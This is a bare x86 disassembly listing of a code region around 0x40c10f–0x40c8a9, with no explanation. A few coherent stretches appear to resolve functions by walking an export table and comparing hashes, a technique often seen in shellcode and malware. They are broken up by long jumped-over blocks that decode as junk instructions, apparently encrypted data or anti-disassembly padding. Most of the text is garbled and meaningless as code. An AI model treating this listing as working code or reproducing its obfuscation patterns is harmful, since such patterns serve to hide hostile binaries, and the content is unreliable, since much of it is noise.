  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eb74
  40c11d:	cmp    DWORD PTR ds:0x430526,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	shl    BYTE PTR [ebx+ebp*8+0x5b],1
  40c14a:	xor    bh,ch
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c1d0
  40c153:	lods   eax,DWORD PTR ds:[esi]
  40c154:	repnz repnz pushf 
  40c157:	xchg   ecx,eax
  40c158:	neg    DWORD PTR [eax+0x74]
  40c15b:	enter  0xdb58,0xc6
  40c15f:	xchg   eax,ebp
  40c161:	loop   0x40c13f
  40c163:	out    dx,eax
  40c164:	push   esp
  40c165:	xchg   edi,edx
  40c167:	push   0x514e2cab
  40c16c:	in     eax,dx
  40c16d:	push   eax
  40c16e:	nop
  40c16f:	push   es
  40c170:	les    ebp,FWORD PTR [esi]
  40c172:	outs   dx,DWORD PTR ds:[esi]
  40c173:	ror    DWORD PTR [eax-0x73],cl
  40c176:	(bad)  
  40c177:	and    ah,BYTE PTR [edx+0x72]
  40c17a:	cmc    
  40c17b:	push   cs
  40c17c:	xchg   esi,eax
  40c17d:	or     DWORD PTR [edx+0x2c],0xfffffff2
  40c181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c182:	fs inc edx
  40c184:	fisttp WORD PTR [ecx]
  40c186:	imul   ebx,DWORD PTR [eax+0x1b0dacc7],0xd
  40c18d:	and    DWORD PTR [edx-0x4a],edi
  40c190:	dec    esi
  40c191:	push   eax
  40c192:	jg     0x40c1ac
  40c194:	sub    DWORD PTR [edi-0x46ea3370],esp
  40c19a:	aad    0x3a
  40c19c:	and    ch,BYTE PTR ds:0x4975481d
  40c1a2:	mov    bh,0x2d
  40c1a4:	fidiv  WORD PTR [ebx-0x55cae4c0]
  40c1aa:	inc    ebx
  40c1ab:	neg    DWORD PTR ds:0x97a15310
  40c1b1:	mov    al,ds:0x3fabf4c4
  40c1b6:	lds    edi,FWORD PTR [edx-0x20f8f44a]
  40c1bc:	adc    eax,0xdcea8dae
  40c1c1:	popf   
  40c1c2:	mov    edi,0x77d40fc0
  40c1c7:	pop    esp
  40c1c8:	sbb    eax,ecx
  40c1ca:	xchg   edi,eax
  40c1cb:	push   es
  40c1cc:	ins    BYTE PTR es:[edi],dx
  40c1cd:	bound  edx,QWORD PTR [edx-0x31]
  40c1d0:	fwait
  40c1d1:	pop    esp
  40c1d2:	inc    edi
  40c1d3:	dec    ebp
  40c1d4:	pushf  
  40c1d5:	sbb    al,0x5
  40c1d7:	out    dx,al
  40c1d8:	dec    ebp
  40c1d9:	mov    edx,0xa4b771a7
  40c1de:	and    al,ch
  40c1e0:	mov    ss,WORD PTR [eax-0x48]
  40c1e3:	mov    edi,0xca16bd2c
  40c1e8:	sub    BYTE PTR [ecx+eax*1-0x52],cl
  40c1ec:	mov    dl,0x8a
  40c1ee:	inc    edi
  40c1ef:	sub    al,0x91
  40c1f1:	jmp    0x7a53:0x63fbdfcf
  40c1f8:	bound  ecx,QWORD PTR [ebx]
  40c1fa:	bound  ebp,QWORD PTR [eax]
  40c1fc:	adc    esp,edx
  40c1fe:	push   ebx
  40c1ff:	arpl   WORD PTR [ebp+0x21],bp
  40c202:	je     0x40c1f7
  40c204:	(bad)  
  40c205:	pop    ebp
  40c206:	xor    DWORD PTR [esi-0x5cf61d6],ecx
  40c20c:	outs   dx,BYTE PTR ds:[esi]
  40c20d:	add    esp,DWORD PTR [edx+0x5e38369a]
  40c213:	xchg   BYTE PTR [edi+ecx*2+0x7c],al
  40c217:	cmp    eax,0x29b59402
  40c21c:	test   eax,0xe82c4524
  40c221:	xlat   BYTE PTR ds:[ebx]
  40c222:	call   0xe95904a3
  40c227:	fwait
  40c228:	rol    BYTE PTR [ecx],1
  40c22a:	inc    esp
  40c22b:	cmp    BYTE PTR [ecx+0x5c],al
  40c22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c22f:	mov    esi,0xbb05f2c3
  40c234:	sub    DWORD PTR [edx],esi
  40c236:	inc    eax
  40c237:	pop    ebx
  40c238:	sbb    cl,BYTE PTR [ebp+0x49a01a98]
  40c23e:	or     ch,ah
  40c240:	xchg   edi,eax
  40c241:	sub    BYTE PTR [ebx],0xe
  40c244:	xchg   esi,eax
  40c245:	jp     0x40c22d
  40c247:	xchg   esi,eax
  40c248:	push   edi
  40c249:	ss sti 
  40c24b:	lods   eax,DWORD PTR ds:[esi]
  40c24c:	daa    
  40c24d:	(bad)  
  40c24e:	pusha  
  40c24f:	fdivr  DWORD PTR [esi-0xc]
  40c252:	cmc    
  40c253:	or     DWORD PTR [edx-0x2e77cf62],eax
  40c259:	pushf  
  40c25a:	pop    ebx
  40c25b:	cmp    DWORD PTR [ebx],ebp
  40c25d:	or     BYTE PTR [ebp+0x38],dh
  40c260:	pop    esi
  40c261:	fwait
  40c262:	in     al,0x94
  40c264:	in     al,0x41
  40c266:	adc    ecx,DWORD PTR [eax+0x38]
  40c269:	dec    esi
  40c26a:	mov    WORD PTR [ecx],es
  40c26c:	push   ecx
  40c26d:	in     eax,dx
  40c26e:	mov    ebx,0x43e45b1b
  40c273:	aam    0x56
  40c275:	in     eax,0x5d
  40c277:	jbe    0x40c26f
  40c279:	iret   
  40c27a:	les    ebp,FWORD PTR [edx+0x40]
  40c27d:	or     eax,0x3b4c1de
  40c282:	lock icebp 
  40c284:	loope  0x40c2dd
  40c286:	ret    
  40c287:	or     dh,bh
  40c289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c28a:	jne    0x40c250
  40c28c:	or     ch,BYTE PTR [edx]
  40c28e:	mov    ecx,0xa4103b7c
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x1ce92bcc,0xf36804ac
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2c0
  40c2bd:	mov    eax,ds:0x10b0fe6
  40c2c2:	mov    ch,0x69
  40c2c4:	or     DWORD PTR [esi],ebp
  40c2c6:	push   ebx
  40c2c7:	cmp    cl,ch
  40c2c9:	shl    DWORD PTR [ebp-0x21],0xe1
  40c2cd:	jmp    0xeec2e61d
  40c2d2:	or     BYTE PTR [ebx+0x3f],dl
  40c2d5:	(bad)  
  40c2d6:	jne    0x40c294
  40c2d8:	daa    
  40c2d9:	shl    DWORD PTR ds:0x9975130d,1
  40c2df:	ficom  WORD PTR [edx+0x6c]
  40c2e2:	ins    BYTE PTR es:[edi],dx
  40c2e3:	mov    cl,0xfd
  40c2e5:	lods   al,BYTE PTR ds:[esi]
  40c2e6:	repz in eax,0xf3
  40c2e9:	adc    esi,ecx
  40c2eb:	in     eax,dx
  40c2ec:	psllq  mm1,mm4
  40c2ef:	mov    cs,WORD PTR [ecx+eiz*4+0x7a0f38fc]
  40c2f6:	inc    edx
  40c2f7:	sbb    dl,BYTE PTR [edx+0x364da2fd]
  40c2fd:	stos   DWORD PTR es:[edi],eax
  40c2fe:	pushf  
  40c2ff:	cdq    
  40c300:	sbb    DWORD PTR [ebx],0x7a44ac5a
  40c306:	and    DWORD PTR [edx-0x2ced4c3a],edx
  40c30c:	cli    
  40c30d:	sbb    dh,ch
  40c30f:	stos   BYTE PTR es:[edi],al
  40c310:	sbb    bh,ch
  40c312:	xor    BYTE PTR [ebx+0x3f2573fa],cl
  40c318:	addr16 sahf 
  40c31a:	mov    DWORD PTR [ebx+edx*1-0x67bea234],esp
  40c321:	and    BYTE PTR [ecx-0xc3216f6],dh
  40c327:	adc    eax,0xb652f067
  40c32c:	jl     0x40c36f
  40c32e:	ins    DWORD PTR es:[edi],dx
  40c32f:	aam    0x5d
  40c331:	inc    ebp
  40c332:	out    0xa2,eax
  40c334:	adc    edi,DWORD PTR fs:[esi]
  40c337:	and    DWORD PTR [edi+eax*1+0x4ba455e0],edx
  40c33e:	mov    dh,0xba
  40c340:	mov    DWORD PTR [ecx],eax
  40c342:	mov    cl,0x5c
  40c344:	arpl   WORD PTR [edi+edi*1],bp
  40c347:	gs jle 0x40c367
  40c34a:	xchg   esp,eax
  40c34b:	xor    bh,bl
  40c34d:	cmp    eax,0x4abb8850
  40c352:	in     eax,0x7
  40c354:	daa    
  40c355:	cmp    esi,ebp
  40c357:	div    BYTE PTR [edx+ebp*4+0x3508b69f]
  40c35e:	add    al,dl
  40c360:	pop    ds
  40c361:	push   eax
  40c362:	imul   eax,esi,0xffffff94
  40c365:	push   edx
  40c366:	push   ebx
  40c367:	pop    ds
  40c368:	and    cl,BYTE PTR [edi-0x146f61f6]
  40c36e:	jb     0x40c391
  40c370:	push   es
  40c371:	add    eax,0xe3e73db3
  40c376:	daa    
  40c377:	lock xor eax,0xbde81456
  40c37d:	neg    DWORD PTR [esi]
  40c37f:	sar    dl,cl
  40c381:	mul    esp
  40c383:	out    0x11,eax
  40c385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c386:	pop    eax
  40c387:	pushf  
  40c388:	sbb    edi,0xffffffc5
  40c38b:	aad    0x13
  40c38d:	not    DWORD PTR ds:0x8069ada3
  40c393:	in     eax,0xe3
  40c395:	push   ecx
  40c396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c397:	pushf  
  40c398:	mov    dl,0x4b
  40c39a:	mov    ebp,0x549e815d
  40c39f:	imul   eax,DWORD PTR [esi-0x5c5d4728],0xbbe55249
  40c3a9:	pop    edi
  40c3aa:	inc    ecx
  40c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ac:	and    BYTE PTR [ebp+esi*4-0x645a50c7],dh
  40c3b3:	dec    ecx
  40c3b4:	xor    esp,DWORD PTR [esi]
  40c3b6:	and    ah,BYTE PTR [ebp+0x4a]
  40c3b9:	cmp    DWORD PTR [ebp+0x12e652e1],edx
  40c3bf:	inc    ecx
  40c3c0:	es jnp 0x40c38d
  40c3c3:	jl     0x40c3fe
  40c3c5:	cmp    DWORD PTR [esi],ebx
  40c3c7:	push   ss
  40c3c8:	jl     0x40c3d4
  40c3ca:	jae    0x40c3da
  40c3cc:	call   0x883e983b
  40c3d1:	cmc    
  40c3d2:	int3   
  40c3d3:	fcmovbe st,st(2)
  40c3d5:	and    eax,0x4151cb6c
  40c3da:	ins    DWORD PTR es:[edi],dx
  40c3db:	shl    DWORD PTR [eax-0x7b3d78f6],1
  40c3e1:	jne    0x40c3b5
  40c3e3:	add    DWORD PTR [esi],esp
  40c3e5:	test   eax,0x8e98377c
  40c3ea:	pop    edi
  40c3eb:	cld    
  40c3ec:	dec    edi
  40c3ed:	xchg   esi,eax
  40c3ee:	lahf   
  40c3ef:	cmp    eax,0x29f2f04b
  40c3f4:	sub    eax,0xbc49110d
  40c3f9:	sahf   
  40c3fa:	loop   0x40c3f5
  40c3fc:	push   edi
  40c3fd:	lea    eax,[ebp-0x8]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	jmp    0x7eff:0xb46162ea
  40c418:	jle    0x40c459
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c3ce
  40c41e:	mov    al,BYTE PTR [ebx-0x4b]
  40c421:	pusha  
  40c422:	mov    ds:0xa76e94c9,eax
  40c427:	xchg   ebx,eax
  40c428:	dec    esp
  40c429:	pusha  
  40c42a:	push   ss
  40c42b:	mov    ah,0x2a
  40c42d:	mov    ds:0x93c13839,eax
  40c432:	xchg   BYTE PTR [esi],dh
  40c434:	es call 0x3dd8f9e4
  40c43a:	fwait
  40c43b:	jl     0x40c3cf
  40c43d:	nop
  40c43e:	loope  0x40c47b
  40c440:	inc    edi
  40c441:	test   DWORD PTR [ebx+0x1],esi
  40c444:	or     eax,0x2daf16ce
  40c449:	sar    BYTE PTR [edx+eiz*8],1
  40c44c:	cdq    
  40c44d:	push   ecx
  40c44e:	cmc    
  40c44f:	mov    ebx,0xc09e1479
  40c454:	mov    DWORD PTR [ebp+0x45],esi
  40c457:	lods   eax,DWORD PTR ds:[esi]
  40c458:	add    eax,0x30137049
  40c45d:	mov    ecx,0x3d4df1f8
  40c462:	and    ch,bh
  40c464:	std    
  40c465:	dec    eax
  40c466:	and    ch,ch
  40c468:	pop    ebp
  40c469:	scas   al,BYTE PTR es:[edi]
  40c46a:	call   0x2bb:0xd0b09293
  40c471:	icebp  
  40c472:	mov    bh,0xdf
  40c474:	push   esi
  40c475:	cmp    bh,BYTE PTR [ecx]
  40c477:	loopne 0x40c43b
  40c479:	inc    ebx
  40c47a:	pop    ecx
  40c47b:	repnz cmp cl,bh
  40c47e:	inc    eax
  40c47f:	xor    ecx,DWORD PTR [ecx+0x0]
  40c482:	xor    DWORD PTR [esi+0x10c7dd49],ebx
  40c488:	adc    DWORD PTR [edx],ecx
  40c48a:	hlt    
  40c48b:	in     al,0xc9
  40c48d:	jo     0x40c437
  40c48f:	pop    ecx
  40c490:	enter  0xc80f,0x75
  40c494:	jle    0x40c4d3
  40c496:	fld    st(6)
  40c498:	inc    esi
  40c499:	adc    eax,0x833c9972
  40c49e:	mov    eax,ds:0xdaffc4ad
  40c4a3:	call   0x34de:0x740a0f1a
  40c4aa:	xchg   edx,eax
  40c4ab:	sub    eax,0x78146e35
  40c4b0:	mov    esi,0x1241998c
  40c4b5:	leave  
  40c4b6:	aas    
  40c4b7:	mov    cl,0x93
  40c4b9:	mov    edi,0xb1f30784
  40c4be:	jae    0x40c4ce
  40c4c0:	add    ch,BYTE PTR [edi+eax*1]
  40c4c3:	sub    ebp,DWORD PTR [esp+eiz*4+0x4a]
  40c4c7:	sub    edx,DWORD PTR [esp-0xa6cc352]
  40c4ce:	scas   eax,DWORD PTR es:[edi]
  40c4cf:	aaa    
  40c4d0:	xor    al,0x40
  40c4d2:	sar    DWORD PTR [edx],1
  40c4d4:	sub    eax,0x2f633280
  40c4d9:	xchg   ebx,eax
  40c4da:	(bad)  [eax-0x6c]
  40c4dd:	ss inc edx
  40c4df:	mov    ah,0x98
  40c4e1:	fwait
  40c4e2:	mov    WORD PTR [ebx-0x74],ss
  40c4e5:	dec    esi
  40c4e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e7:	mov    ds:0xf887efea,al
  40c4ec:	lods   al,BYTE PTR ds:[esi]
  40c4ed:	pop    ds
  40c4ee:	push   ebx
  40c4ef:	cmp    ecx,DWORD PTR [edi+0x3f]
  40c4f2:	fisubr WORD PTR ds:0x6fba86a5
  40c4f8:	cwde   
  40c4f9:	cmp    ecx,DWORD PTR [edx]
  40c4fb:	ins    DWORD PTR es:[edi],dx
  40c4fc:	mov    dh,BYTE PTR [esi+0x6e]
  40c4ff:	test   eax,0x6a50c77
  40c504:	mov    eax,0xd3db74f7
  40c509:	sub    DWORD PTR [ecx+0x3669c46a],esp
  40c50f:	pop    ds
  40c510:	fimul  DWORD PTR ss:[edi-0x6f]
  40c514:	sbb    al,0x0
  40c516:	inc    edi
  40c517:	outs   dx,DWORD PTR ds:[esi]
  40c518:	mul    DWORD PTR [ecx+0x6c]
  40c51b:	sbb    BYTE PTR [edx+esi*2+0x12],bl
  40c51f:	jae    0x40c4dd
  40c521:	js     0x40c4e9
  40c523:	cmp    al,0xe3
  40c525:	cmp    eax,0x76db1546
  40c52a:	xchg   ebx,eax
  40c52b:	or     DWORD PTR [ecx],0x39
  40c52e:	hlt    
  40c52f:	and    BYTE PTR [edx+0x3b],0xea
  40c533:	ficomp DWORD PTR [esp+edx*8]
  40c536:	retf   
  40c537:	mov    ds:0x191b56ea,eax
  40c53c:	data16 adc ch,BYTE PTR [edi-0x4e1bc96c]
  40c543:	and    DWORD PTR [ebx+esi*2+0x91f4175],ebp
  40c54a:	in     eax,dx
  40c54b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c54c:	pop    esi
  40c54d:	mov    ch,BYTE PTR [ebx]
  40c54f:	adc    edx,DWORD PTR [esi+eax*4]
  40c552:	jae    0x40c543
  40c554:	cmc    
  40c555:	mov    cl,0xa4
  40c557:	sbb    eax,0xc9f2cee0
  40c55c:	scas   eax,DWORD PTR es:[edi]
  40c55d:	outs   dx,DWORD PTR ds:[esi]
  40c55e:	mov    DWORD PTR [ebp-0x30],ecx
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x8b62a908
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c551
  40c58e:	or     ah,BYTE PTR [edx+edi*8-0x24]
  40c592:	jle    0x40c578
  40c594:	nop
  40c595:	sbb    DWORD PTR [esi-0x56],ecx
  40c598:	shl    DWORD PTR [esp+edx*1+0x43],cl
  40c59c:	mul    DWORD PTR [esi+0x23]
  40c59f:	cld    
  40c5a0:	add    ch,ah
  40c5a2:	cli    
  40c5a3:	inc    ecx
  40c5a4:	and    ebx,DWORD PTR [edi+edx*4]
  40c5a7:	xchg   ebp,eax
  40c5a8:	ins    DWORD PTR es:[edi],dx
  40c5a9:	mov    ebp,0xf860e7c3
  40c5ae:	jg     0x40c570
  40c5b0:	iret   
  40c5b1:	cmp    al,0x5b
  40c5b3:	pop    esi
  40c5b4:	mov    ah,0xce
  40c5b6:	cwde   
  40c5b7:	pop    esi
  40c5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b9:	inc    ebp
  40c5ba:	mov    esp,0x4cb3194b
  40c5bf:	in     al,dx
  40c5c0:	mov    ebp,0x958e16cf
  40c5c5:	cmp    eax,0xe3212776
  40c5ca:	sub    al,0x99
  40c5cc:	xor    BYTE PTR [ebp+ebx*8+0x4c],bl
  40c5d0:	xor    edi,ecx
  40c5d2:	mov    WORD PTR ds:0xd5ecd1f8,fs
  40c5d8:	loop   0x40c5a7
  40c5da:	mov    ebp,0x2b188c6
  40c5df:	adc    al,0x65
  40c5e1:	pop    ss
  40c5e2:	retf   0xbca
  40c5e5:	push   ss
  40c5e6:	mov    si,0x3da0
  40c5ea:	push   esp
  40c5eb:	xchg   ecx,eax
  40c5ec:	mov    cl,0x9c
  40c5ee:	sub    ch,0x65
  40c5f1:	fdiv   DWORD PTR [esi+0x38]
  40c5f4:	fwait
  40c5f5:	pushf  
  40c5f6:	icebp  
  40c5f7:	lock mov ecx,0x95e3f24
  40c5fd:	xor    BYTE PTR [edx+0xaaddb37],ah
  40c603:	push   ds
  40c604:	push   0x2c
  40c606:	dec    edi
  40c607:	push   0xea45128
  40c60c:	xor    bh,cl
  40c60e:	push   esi
  40c60f:	or     BYTE PTR [edi+0x5ae7aef3],0x2f
  40c616:	jbe    0x40c655
  40c618:	(bad)  
  40c619:	xchg   esp,eax
  40c61a:	pop    esi
  40c61b:	mov    BYTE PTR [ecx-0x8af12b9],al
  40c621:	jno    0x40c5a8
  40c623:	mov    BYTE PTR [bp+0x6f],dl
  40c627:	mov    al,ds:0x47e846d0
  40c62c:	sub    BYTE PTR [ecx+0x0],dl
  40c62f:	mov    cl,0xea
  40c631:	popf   
  40c632:	inc    ebp
  40c633:	xchg   ebp,eax
  40c634:	mov    eax,0x7249bf26
  40c639:	xchg   esp,eax
  40c63a:	jg     0x40c636
  40c63c:	out    dx,al
  40c63d:	sub    al,0x4e
  40c63f:	and    bh,bl
  40c641:	and    DWORD PTR [ebp-0x104ba50],ebx
  40c647:	out    dx,al
  40c648:	retf   
  40c649:	popf   
  40c64a:	pop    ebp
  40c64b:	lock add ah,BYTE PTR [eax]
  40c64e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c64f:	add    eax,0x626a1d86
  40c654:	and    DWORD PTR [ebx],esi
  40c656:	sbb    esi,DWORD PTR [edi+ebx*4+0x531b334e]
  40c65d:	fld    QWORD PTR [ebp+0x69]
  40c660:	sbb    ch,dl
  40c662:	leave  
  40c663:	add    edx,DWORD PTR [ebp+0x42dc7b3a]
  40c669:	jl     0x40c5f6
  40c66b:	cli    
  40c66c:	push   ebx
  40c66d:	or     bl,ah
  40c66f:	adc    al,0x49
  40c671:	mov    WORD PTR [ebx],?
  40c673:	jecxz  0x40c6e1
  40c675:	jae    0x40c624
  40c677:	xor    DWORD PTR [ebx-0x7c],0xf8cf839d
  40c67e:	fiadd  WORD PTR [ebx+0x1c69b87f]
  40c684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c685:	popf   
  40c686:	repz div DWORD PTR [ebx-0x30]
  40c68a:	xchg   esp,eax
  40c68b:	dec    ebx
  40c68c:	ja     0x40c6bc
  40c68e:	jg     0x40c656
  40c690:	icebp  
  40c691:	in     al,0xcd
  40c693:	mov    cl,bh
  40c695:	lods   eax,DWORD PTR ds:[si]
  40c697:	sahf   
  40c698:	test   BYTE PTR [edx-0x69],bl
  40c69b:	adc    DWORD PTR [eax],ebx
  40c69d:	push   0xffffffee
  40c69f:	pop    edx
  40c6a0:	sub    eax,0xfeb4d02c
  40c6a5:	dec    eax
  40c6a6:	jbe    0x40c70e
  40c6a8:	je     0x40c6e9
  40c6aa:	jmp    0x82e41412
  40c6af:	into   
  40c6b0:	movaps XMMWORD PTR [ecx+0x7d10c1e],xmm2
  40c6b7:	adc    eax,0x50b1d929
  40c6bc:	mov    bl,BYTE PTR [edi+edx*8-0x6c]
  40c6c0:	outs   dx,DWORD PTR ds:[esi]
  40c6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c2:	stc    
  40c6c3:	inc    edi
  40c6c4:	std    
  40c6c5:	popf   
  40c6c6:	daa    
  40c6c7:	clc    
  40c6c8:	adc    eax,ebx
  40c6ca:	inc    ebx
  40c6cb:	inc    eax
  40c6cc:	push   ds
  40c6cd:	mov    esi,0x35f84d8b
  40c6d2:	push   esi
  40c6d3:	or     BYTE PTR [ecx+0x7],dl
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	inc    ebx
  40c741:	push   edx
  40c742:	jp     0x40c784
  40c744:	ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c7a3
  40c74d:	mov    WORD PTR [ebx+0x35],gs
  40c750:	call   0x1ce389a4
  40c755:	or     eax,0x3a608a7c
  40c75a:	or     eax,0x3a78831
  40c75f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c760:	adc    DWORD PTR [ecx-0x26172f55],0x485c82c6
  40c76a:	xchg   edx,eax
  40c76b:	or     al,0x7e
  40c76d:	fldcw  WORD PTR ds:0xb2cc3074
  40c773:	jmp    0x8ae091db
  40c778:	push   ds
  40c779:	psraw  mm2,mm4
  40c77c:	out    0xb9,eax
  40c77e:	loope  0x40c748
  40c780:	pop    ds
  40c781:	xor    al,0x7d
  40c783:	or     ecx,edx
  40c785:	aaa    
  40c786:	inc    ebp
  40c787:	mov    DWORD PTR [ecx],edi
  40c789:	iret   
  40c78a:	imul   edx,eax,0xdb461335
  40c790:	pop    ss
  40c791:	data16 sbb ah,al
  40c794:	scas   eax,DWORD PTR es:[edi]
  40c795:	pushf  
  40c796:	adc    ch,ch
  40c798:	into   
  40c799:	loope  0x40c7ee
  40c79b:	or     BYTE PTR [edi-0x4441892],0xe5
  40c7a2:	outs   dx,BYTE PTR ds:[esi]
  40c7a3:	add    al,0x1d
  40c7a5:	cld    
  40c7a6:	cmp    bl,bl
  40c7a8:	xchg   edx,eax
  40c7a9:	pusha  
  40c7aa:	add    al,0x8b
  40c7ac:	xchg   edx,eax
  40c7ad:	or     ebx,DWORD PTR [ecx+0x58]
  40c7b0:	sub    esi,ecx
  40c7b2:	sub    bl,dl
  40c7b4:	pop    eax
  40c7b5:	add    cl,0x1c
  40c7b8:	cmp    al,0xff
  40c7ba:	fstp   TBYTE PTR [ebp+ebx*8-0x64fcaec2]
  40c7c1:	dec    edi
  40c7c2:	ror    DWORD PTR [ecx+0x559eb26a],cl
  40c7c8:	icebp  
  40c7c9:	pusha  
  40c7ca:	js     0x40c7b3
  40c7cc:	mov    WORD PTR [ebp-0x39],ss
  40c7cf:	fimul  WORD PTR [edx-0x77fbcdbf]
  40c7d5:	push   ebp
  40c7d6:	dec    ebp
  40c7d7:	ret    0xc2bd
  40c7da:	xchg   ecx,eax
  40c7db:	and    al,0xb2
  40c7dd:	xor    eax,0x30ba61ce
  40c7e2:	mov    ch,0xe1
  40c7e4:	cli    
  40c7e5:	gs shl edi,1
  40c7e8:	fidivr DWORD PTR [ecx-0x247e8c26]
  40c7ee:	push   edx
  40c7ef:	ret    
  40c7f0:	cs xchg ebx,eax
  40c7f2:	sbb    DWORD PTR [eax+0x6a2f69e9],esp
  40c7f8:	add    sp,WORD PTR [ebx]
  40c7fb:	push   ds
  40c7fc:	call   0x16a4:0xdfe9045c
  40c803:	jmp    0x56f38961
  40c808:	mov    ecx,0x6ca0c973
  40c80d:	push   ss
  40c80e:	push   edi
  40c80f:	and    eax,0x17f4447f
  40c814:	ds test eax,0x8618f267
  40c81a:	sub    BYTE PTR [ecx-0x66f15212],bh
  40c820:	lea    edi,[esi+0x4064c98]
  40c826:	imul   ecx,DWORD PTR [edx+ebx*2],0x6b715c9
  40c82d:	mov    ds:0xd0fc2f66,eax
  40c832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c833:	lods   al,BYTE PTR ds:[esi]
  40c834:	lds    edi,FWORD PTR [edi-0x32]
  40c837:	aam    0x6e
  40c839:	push   es
  40c83a:	mov    ebx,0x42dcb75c
  40c83f:	cmc    
  40c840:	mov    ss,WORD PTR [ecx-0x4be2a5e3]
  40c846:	inc    ebx
  40c847:	cmp    al,BYTE PTR [ecx+0x55]
  40c84a:	or     bl,cl
  40c84c:	lock lock push edx
  40c84f:	pop    edx
  40c850:	cmc    
  40c851:	fs dec eax
  40c853:	popa   
  40c854:	and    BYTE PTR [ecx+0x624445d0],0x5
  40c85b:	fidivr DWORD PTR [esi+0x3f]
  40c85e:	pop    edx
  40c85f:	sbb    eax,0x35eaa34e
  40c864:	cmp    edx,DWORD PTR [eax-0x5c]
  40c867:	(bad)  
  40c868:	mov    edx,0x120807f4
  40c86d:	out    dx,eax
  40c86e:	lea    edi,[bx+si-0x1ee2]
  40c873:	sti    
  40c874:	mov    WORD PTR [ebp+0x533cdc7a],fs
  40c87a:	loop   0x40c865
  40c87c:	ficomp DWORD PTR [eax-0x1b42afa1]
  40c882:	pop    ecx
  40c883:	jge    0x40c8bf
  40c885:	call   0x2d0f4aa4
  40c88a:	pop    ecx
  40c88b:	jno    0x40c8d2
  40c88d:	mov    eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
